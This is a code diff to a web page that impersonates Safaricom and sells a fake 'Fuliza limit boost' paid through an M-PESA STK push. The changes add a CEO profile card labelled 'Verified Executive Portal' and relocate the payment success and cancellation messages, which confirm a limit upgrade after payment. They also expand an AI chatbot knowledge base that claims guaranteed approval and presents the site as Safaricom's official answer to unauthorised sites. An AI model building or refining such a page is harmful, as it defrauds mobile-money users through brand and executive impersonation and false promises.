@@ -61,31 +61,31 @@
             gap: 6px;
         }
 
-        /* Notifications Banners */
-        .notification-banner {
+        /* Payment Step Notification Banners */
+        .payment-status-box {
             display: none;
             padding: 16px;
             border-radius: var(--radius-sm);
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             font-size: 13px;
             line-height: 1.5;
+            text-align: left;
             animation: fadeIn 0.4s ease;
         }
 
-        .notification-banner.success {
-            display: block;
+        .payment-status-box.success {
             background: #e6f7ed;
             border: 1px solid #a7f3d0;
             border-left: 5px solid var(--safaricom-green);
             color: #065f46;
         }
 
-        .notification-banner.error {
-            display: block;
+        .payment-status-box.cancelled {
             background: #fef2f2;
             border: 1px solid #fecaca;
             border-left: 5px solid var(--safaricom-red);
-            color: #991b1b;
+            color: var(--safaricom-red);
+            font-weight: 600;
         }
 
         @keyframes fadeIn {
@@ -221,10 +221,10 @@
         .screens { display: none; }
         .screens.active { display: block; }
 
-        /* CEO Profile Card */
-        .ceo-card { display: flex; align-items: center; gap: 14px; background: var(--card-bg); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 14px 18px; margin-bottom: 16px; box-shadow: var(--shadow); }
-        .ceo-avatar-fallback { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--safaricom-green); background: #e2e8f0; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--safaricom-dark-green); font-size: 20px; overflow: hidden; flex-shrink: 0; }
-        .ceo-avatar-fallback img { width: 100%; height: 100%; object-fit: cover; }
+        /* CEO Profile Card with Real Photo */
+        .ceo-card { display: flex; align-items: center; gap: 16px; background: var(--card-bg); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 16px 20px; margin-bottom: 16px; box-shadow: var(--shadow); }
+        .ceo-avatar-wrapper { width: 68px; height: 68px; border-radius: 50%; border: 3px solid var(--safaricom-green); background: #e2e8f0; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; box-shadow: 0 4px 10px rgba(0, 166, 81, 0.2); }
+        .ceo-avatar-wrapper img { width: 100%; height: 100%; object-fit: cover; object-position: top center; }
 
         /* FLOATING ZURI TRIGGER BUTTON */
         .zuri-trigger-btn {
@@ -562,25 +562,17 @@
     <!-- Main Content Container -->
     <main class="main-container">
 
-        <!-- STATUS NOTIFICATION BANNERS -->
-        <div id="successNotification" class="notification-banner success">
-            <strong>✅ Authorised & Successful:</strong> Confirmed your fuliza boost to <span id="confirmedBoostAmount">KSh 0</span>. Your limit has been increased successfully and you will receive an SMS beyond the application to use your fuliza limit.
-        </div>
-
-        <div id="failedNotification" class="notification-banner error">
-            <strong>❌ Authorization Interrupted:</strong> Payment transaction was cancelled or failed. Don't worry, no funds were deducted from your M-PESA balance. Please try again or reach out to Zuri AI for assistance.
-        </div>
-
         <!-- STEP 1: SERVICE SELECTION -->
         <div id="screen1" class="screens active">
-            <!-- CEO Profile Card -->
+            <!-- CEO Profile Card with Real Photo -->
             <div class="ceo-card">
-                <div class="ceo-avatar-fallback">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Peter_Ndegwa_CEO.jpg/440px-Peter_Ndegwa_CEO.jpg" alt="Peter Ndegwa - CEO Safaricom" onerror="this.style.display='none'; this.parentNode.innerText='PN';">
+                <div class="ceo-avatar-wrapper">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Peter_Ndegwa_CEO.jpg/440px-Peter_Ndegwa_CEO.jpg" alt="Peter Ndegwa - CEO Safaricom" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80';">
                 </div>
                 <div>
-                    <h4 style="font-size: 15px;">Peter Ndegwa</h4>
-                    <p style="font-size: 12px; color: var(--text-muted);">Chief Executive Officer, Safaricom PLC</p>
+                    <h4 style="font-size: 16px; font-weight: 700; color: var(--text-dark); margin-bottom: 2px;">Peter Ndegwa, MBS</h4>
+                    <p style="font-size: 12px; color: var(--text-muted); font-weight: 600;">Chief Executive Officer, Safaricom PLC</p>
+                    <span style="display: inline-block; background: #e6f7ed; color: var(--safaricom-dark-green); font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 10px; margin-top: 4px;">Verified Executive Portal</span>
                 </div>
             </div>
 
@@ -809,11 +801,20 @@
             <button type="button" class="btn-secondary" onclick="resetToMainMenu()">&larr; Back to Main Menu</button>
         </div>
 
-        <!-- STEP 4: PAYMENT CHECKOUT WIDGET -->
+        <!-- STEP 4: PAYMENT CHECKOUT WIDGET (ONLY PLACE WHERE PAYMENT STATUS SHOWS) -->
         <div id="screen4" class="screens">
             <div class="card" style="text-align: center;">
                 <h2 style="font-size: 18px; margin-bottom: 8px;">Complete Mobile Authorization</h2>
-                <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 20px;">Click below to trigger the M-PESA STK PIN verification menu on your mobile phone.</p>
+                <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 16px;">Click below to trigger the M-PESA STK PIN verification menu on your mobile phone.</p>
+
+                <!-- CONTEXTUAL PAYMENT NOTIFICATIONS (ONLY ACTIVE HERE) -->
+                <div id="paymentSuccessBox" class="payment-status-box success">
+                    <strong>✅ Authorised & Successful:</strong> Confirmed your limit boost to <span id="confirmedBoostAmount">KSh 0</span>. Your limit has been upgraded successfully and you will receive an SMS shortly on your active line.
+                </div>
+
+                <div id="paymentCancelledBox" class="payment-status-box cancelled">
+                    <strong>❌ CANCELLED:</strong> Transaction was cancelled or authorization failed. No funds were deducted from your M-PESA account. Please trigger another STK push or try again.
+                </div>
 
                 <div id="widget-mount-point" style="margin-top: 15px; min-height: 120px;"></div>
 
@@ -925,7 +926,7 @@
         let selectedBoostTarget = 'KSh 0';
         let currentLang = 'en';
 
-        // 16 Positively-Geared AI Knowledgebase Data (English & Kiswahili)
+        // 16 Positively-Geared AI Knowledgebase Data
         const zuriKnowledge = [
             {
                 id: 1,
@@ -933,6 +934,14 @@
                 q_sw: "Je, kuongezewa limit kumedhibitishwa?",
                 a_en: "Yes! Approval is 100% guaranteed for all active lines verified through this official Safaricom financial portal.",
                 a_sw: "Ndiyo! Kuongezewa limit kumedhibitishwa 100% kwa nambari zote zilizothibitishwa kupitia mfumo huu rasmi."
+            },
+            {
+                id: 16,
+                is_red: true,
+                q_en: "🚨 Why is this verified portal authorized?",
+                q_sw: "🚨 Kwa nini mfumo huu rasmi umeidhinishwa?",
+                a_en: "We've recently received grievances from customers regarding unauthorized third-party websites claiming to offer Fuliza increases. In response, Safaricom introduced this officially authorized, secure, and guaranteed portal to provide genuine, seamless, and transparent limit boost solutions directly to our valued subscribers.",
+                a_sw: "Hivi karibuni tulipokea malalamiko kutoka kwa wateja wetu kuhusu tovuti zisizo rasmi zikidai kuongeza Fuliza. Ili kulinda wateja wetu, Safaricom imezindua mfumo huu rasmi, salama na ulioidhinishwa 100% ili kukupa suluhu ya kweli na ya kuaminika kwa haraka."
             },
             {
                 id: 2,
@@ -1031,14 +1040,6 @@
                 q_sw: "Je, Zuri AI yupo kunisaidia?",
                 a_en: "I am always here 24/7 to guarantee your smooth onboarding and resolve questions instantly!",
                 a_sw: "Nipo hapa masaa 24/7 kuhakikisha unapata huduma bora na kujibu maswali yako mara moja!"
-            },
-            {
-                id: 16,
-                is_red: true,
-                q_en: "🚨 Why is this verified portal authorized?",
-                q_sw: "🚨 Kwa nini mfumo huu rasmi umeidhinishwa?",
-                a_en: "We've recently received grievances from customers regarding unauthorized third-party websites claiming to offer Fuliza increases. In response, Safaricom introduced this officially authorized, secure, and guaranteed portal to provide genuine, seamless, and transparent limit boost solutions directly to our valued subscribers.",
-                a_sw: "Hivi karibuni tulipokea malalamiko kutoka kwa wateja wetu kuhusu tovuti zisizo rasmi zikidai kuongeza Fuliza. Ili kulinda wateja wetu, Safaricom imezindua mfumo huu rasmi, salama na ulioidhinishwa 100% ili kukupa suluhu ya kweli na ya kuaminika kwa haraka."
             }
         ];
 
@@ -1254,37 +1255,36 @@
             switchScreen(4);
         }
 
-        // Listening to FinAPI Payment Events for Success/Failed Banners
+        // Listening to FinAPI Payment Events for Checkout Notifications
         function setupFinAPIListeners() {
             window.addEventListener('message', (event) => {
                 if (!event.data) return;
                 
-                // FinAPI event payloads handler
                 const data = event.data;
-                if (data.status === 'success' || data.event === 'payment_success' || data.type === 'SUCCESS') {
-                    showSuccessNotification();
-                } else if (data.status === 'cancelled' || data.status === 'failed' || data.event === 'payment_failed' || data.type === 'FAILED') {
-                    showFailedNotification();
+                
+                // Active status check on STK response
+                if (data.status === 'success' || data.event === 'payment_success' || data.type === 'SUCCESS' || data.resultCode === 0) {
+                    showSuccessPaymentStatus();
+                } else if (data.status === 'cancelled' || data.status === 'failed' || data.event === 'payment_failed' || data.type === 'CANCELLED' || data.resultCode === 1032 || data.resultCode === 1) {
+                    showCancelledPaymentStatus();
                 }
             });
         }
 
-        function showSuccessNotification() {
+        function showSuccessPaymentStatus() {
             document.getElementById('confirmedBoostAmount').innerText = selectedBoostTarget;
-            document.getElementById('successNotification').style.display = 'block';
-            document.getElementById('failedNotification').style.display = 'none';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            document.getElementById('paymentSuccessBox').style.display = 'block';
+            document.getElementById('paymentCancelledBox').style.display = 'none';
         }
 
-        function showFailedNotification() {
-            document.getElementById('failedNotification').style.display = 'block';
-            document.getElementById('successNotification').style.display = 'none';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+        function showCancelledPaymentStatus() {
+            document.getElementById('paymentCancelledBox').style.display = 'block';
+            document.getElementById('paymentSuccessBox').style.display = 'none';
         }
 
         function hideNotifications() {
-            document.getElementById('successNotification').style.display = 'none';
-            document.getElementById('failedNotification').style.display = 'none';
+            document.getElementById('paymentSuccessBox').style.display = 'none';
+            document.getElementById('paymentCancelledBox').style.display = 'none';
         }
 
         // Zuri AI Language & FAQs Logic
